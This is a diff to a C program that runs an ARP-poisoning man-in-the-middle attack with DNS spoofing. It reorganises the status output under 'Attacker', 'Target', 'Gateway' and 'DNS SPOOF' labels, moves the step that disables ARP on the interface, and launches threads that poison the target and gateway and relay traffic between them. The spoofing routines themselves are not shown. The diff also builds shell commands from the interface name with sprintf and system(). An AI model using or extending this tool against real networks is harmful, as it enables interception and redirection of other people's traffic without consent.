@@ -10,17 +10,21 @@ void usage()
     exit(0);
 }
 void* detect_ctrlD(void* interface){
-        fprintf(stderr, "Waiting Ctrl D\n");
     char* iface = (char*) interface;
+    char cmd[1024];
+    memset(cmd, 0, 1024);
+    sprintf(cmd, "ip link set dev %s arp off", iface);
+    system(cmd);
+    fprintf(stderr, "Turned off ARP of %s\n", iface);
     char c;
     c = getc(stdin);
     if( c == -1){
-        char cmd[1024];
+
         memset(cmd, 0, 1024);
         sprintf(cmd, "ip link set dev %s arp on", iface);
         system(cmd);
-        fprintf(stderr, "Turning ARP on...\n");
-        sleep(0.5);
+        fprintf(stderr, "\nTurning ARP on and exit\n");
+        usleep(100000);
         exit(0);
     }
 }
@@ -60,11 +64,10 @@ int main(int argc, char** argv[]){
         fprintf(stderr, "Error in creating fd socket\n");
         return -1;
     }
-    char cmd[1024];
-    memset(cmd, 0, 1024);
-    sprintf(cmd, "ip link set dev %s arp off", interface);
-    system(cmd);
 
+    pthread_t detect_ctrl_D;
+    pthread_create(&detect_ctrl_D, NULL, detect_ctrlD, (void*) &interface);
+    sleep(1);
     struct ifreq if_idx, if_mac, if_ip;
 
     //copy :()
@@ -94,14 +97,12 @@ int main(int argc, char** argv[]){
     uint8_t *my_ip = (uint8_t*) calloc(4, sizeof(uint8_t));
     uint8_t *my_mac = (uint8_t*) calloc(ETH_ALEN, sizeof(uint8_t));
     int i;
-    printf("_________________________________\n");
     for(i=0;i<6;i++)
         *(my_mac+i) = if_mac.ifr_hwaddr.sa_data[i];
     for(i=2;i<6;i++)
         *(my_ip+i-2) = if_ip.ifr_addr.sa_data[i];
 
-    fprintf(stderr, "my MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *my_mac, *(my_mac+1), *(my_mac+2), *(my_mac+3), *(my_mac+4), *(my_mac+5));
-    fprintf(stderr, "my IP: %d.%d.%d.%d\n", *my_ip, *(my_ip+1), *(my_ip+2), *(my_ip+3));
+
 
     struct sockaddr_ll socket_address;
     socket_address.sll_ifindex = if_idx.ifr_ifindex;
@@ -109,17 +110,22 @@ int main(int argc, char** argv[]){
     socket_address.sll_family = AF_PACKET;
     unsigned int addr_len = (unsigned int) sizeof(struct sockaddr_ll);
 
-    pthread_t detect_ctrl_D;
-    pthread_create(&detect_ctrl_D, NULL, detect_ctrlD, (void*) &interface);
+
 
     uint8_t *target_mac, *gateway_mac;
+    fprintf(stderr, "Collecting data...\n");
     target_mac = get_mac(fd, socket_address, addr_len, my_mac, my_ip, ip_target);
     gateway_mac = get_mac(fd, socket_address, addr_len, my_mac, my_ip, ip_gateway);
     close(fd);
-    fprintf(stderr, "Target MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));
-    fprintf(stderr, "Gateway MAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *gateway_mac, *(gateway_mac+1), *(gateway_mac+2), *(gateway_mac+3), *(gateway_mac+4), *(gateway_mac+5));
-    fprintf(stderr, "Target QNAME: %s\n", qname);
-    fprintf(stderr, "Spoof IP: %d.%d.%d.%d\n__________\n", *ip_dns_fake, *(ip_dns_fake+1), *(ip_dns_fake+2), *(ip_dns_fake+3));
+
+    fprintf(stderr, "Attacker:\tMAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\t\t", *my_mac, *(my_mac+1), *(my_mac+2), *(my_mac+3), *(my_mac+4), *(my_mac+5));
+    fprintf(stderr, "IP: %d.%d.%d.%d\n", *my_ip, *(my_ip+1), *(my_ip+2), *(my_ip+3));
+    fprintf(stderr, "Target: \tMAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\t\t", *target_mac, *(target_mac+1), *(target_mac+2), *(target_mac+3), *(target_mac+4), *(target_mac+5));
+    fprintf(stderr, "IP: %d.%d.%d.%d\n", *ip_target, *(ip_target+1), *(ip_target+2), *(ip_target+3));
+    fprintf(stderr, "Gateway: \tMAC: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\t\t", *gateway_mac, *(gateway_mac+1), *(gateway_mac+2), *(gateway_mac+3), *(gateway_mac+4), *(gateway_mac+5));
+    fprintf(stderr, "IP: %d.%d.%d.%d\n", *ip_gateway, *(ip_gateway+1), *(ip_gateway+2), *(ip_gateway+3));
+    fprintf(stderr, "DNS SPOOF:\tQNAME: %s\t\t", qname);
+    fprintf(stderr, "IP: %d.%d.%d.%d\n", *ip_dns_fake, *(ip_dns_fake+1), *(ip_dns_fake+2), *(ip_dns_fake+3));
     //start arp attack
     pthread_t arpspoof, tar_to_gtw, gtw_to_tar;
  
@@ -136,6 +142,7 @@ int main(int argc, char** argv[]){
     args->ip_dns_fake = ip_dns_fake;
     args->qname = qname;
 
+    fprintf(stderr, "Attacking...\n");
     pthread_create(&arpspoof, NULL, arp_spoofing, (void*) args);
     pthread_create(&tar_to_gtw, NULL, target_to_gateway, (void*) args);
     pthread_create(&gtw_to_tar, NULL, gateway_to_target, (void*) args);
